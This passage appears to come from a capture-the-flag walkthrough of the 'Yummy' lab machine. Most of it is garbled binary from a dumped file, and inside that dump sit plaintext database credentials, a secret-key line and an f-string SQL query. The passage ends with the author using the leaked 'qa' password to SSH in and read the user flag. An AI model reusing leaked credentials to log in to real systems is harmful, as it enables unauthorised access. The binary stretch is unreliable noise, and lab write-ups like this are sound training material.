                                                                                                                               3�������������b��|�50;�@�ZD8H1ƙCVO���]�␦��1wG��6��%گ0�:�wԿ�Y��Ffa]�F�fM���X4$`ģ� 旟��{�ek�Sg����&�D7h�rv��H��D��4bHQ�    �,���cȯ=b�s�^��Z
                                                        �c␦��-�A�����-��
                                                                        �H�:�3A��t�R� r�����UO:H/��ޚr��t�q0�]������L��F�f�.*��m��Jb
        b����;��\����f{A���#pz�m}�t�äEG�4ת��Z�b                                                                                    ��Ά�6���    ]�J�<-?ј|�
                                               ���=
                                                   z��Nk�"?     ��(������ 0���W�!���8�j�kE��(�/�`bm7piL�����*�.H��n�{�&i�K�ϔ�y���!a�$�%w���x#@
                                                                                                                                              E�\_`��
�Au��,�z�e����ߡ��kL�=����IH�(Z~�M~}{�'�F�,^
���K�^�9��up��`%�d!Q0��z[���}9�z�Q�w8 %��6^$�@���2Y�RNG�A�����q��67*o�5=�)�ռ㆏[N����<�jl&�0      ��Y=[�`�,
                                                                                                         ��a�a*1^�;;w�>~��<��1���)�clR1��=SѺ5���JHR��4-k:EE�O�x�9��s�!˲�����q��w^o������� �'���$�ۈ�e��Y�A���!1�@&ɸxi��%3##�0�@f�e��3N�4K�[
��
rB�HI 'DQkX�ըtvGq�a�g�la:ׄ^�B[$�9�u�(���6�U,ݱB�Q#ܱ����:U
                                                        �H,�W␦��q       �ZaTb���A����ʠ���$�%*�����)T�1���}����|����D��LT��vD��Y>$-@��a��W��,�SI
                                                                                                                                               k�׊%ݛ
                                                                                                                                                    ��|YC^,2���
                                                                                                                                                               l�&�����8Q7���6�����:U�,貽#0�0�V�įz�*�QM�J�

¶)q����e���%Ш��ab�^�
c�(�/� �m��#)�� ϳ�m۶���C�O�6W�t[QRpn@/S��N����^d�
x�(�������                                       ���)|Lr:�c,�W�Vz�SDN�Z�/Jb|�%n8��`&^M����IG�:1t�n�����)}���K���>odyٿ$՘|��h�    4�զ�    A#�g�à`�+�j�0����d�|
�A�(*
     �f�
       E1(�/� ��$�&'app.secret_key = s.token_hex(32)
&u'cT sql = f"SELECT * FROM appointments WHERE_email LIKE %s"
�ɕp=��E(������##md5�P�����+v�Kw9    'user': 'chef',
    'password': '3wDo7gSRZIwIHRxZ!',
EJ*������uY�0��+2ܩ-]%���(�(�/�`O
�<.`������6�߽��}�v�v�@P��D�2ӕ�_␦B�Mu;G
                                      �.-1
                                          ��D�  �kk��Y益H���ΣVps
                                                                �K�a�0�VW��;h�������B�
                                                                                      ;ó~z�q�{�+>=�O_�q6� �"V˺&f�*�T㔇D��퍂��@��V([Q���������̋G��φ����>GQ$
�D��,3�eJoH|j�)�(𶠀yh]��6����~Z�[hY�
                                    �   �w�4L
{��]�ߚ�D������fJ�:�����s)�����}              �3�ZШ�݆{S?�m��*H�چ���V3�Y�(��]���
 ��L��S�eE��6K�6    'user': 'qa',
    'password': 'jPAd!XQCtn8Oc@2B',
&E&�&�'#'�'�
�0+,0*d ����$4�p�"��_���6�.(�/�`�5      �P8*p�c����g� kwJj��*�zӦ9$՚��N;�Z�U�
    ĉ��D����P�*˅��\Q��]+'¤�2,%��-��Y��
                                      Ąb�,��d[I})u�␦�r��}�X�����F��K>
                                                                     +␦��@t���k� 9��j��0�04�k��+�O�h���׷
Y
�d�|�p$ JJKx8�D'<a��Z���byh�U�v�]�      
```

Simply SSH in and get `user.txt`:

```console
root@kali:~# ssh qa@yummy.htb
Warning: Permanently added 'yummy.htb' (ED25519) to the list of known hosts.
qa@yummy.htb's password:
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-31-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Jan 11 08:10:25 AM UTC 2025

  System load:  0.08              Processes:             259
  Usage of /:   62.9% of 5.56GB   Users logged in:       0
  Memory usage: 21%               IPv4 address for eth0: 10.10.11.36
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

10 updates can be applied immediately.
10 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

qa@yummy:~$ hostname
yummy
qa@yummy:~$ cat user.txt
14a7f43260d0074218437a9a6cf2a657
```
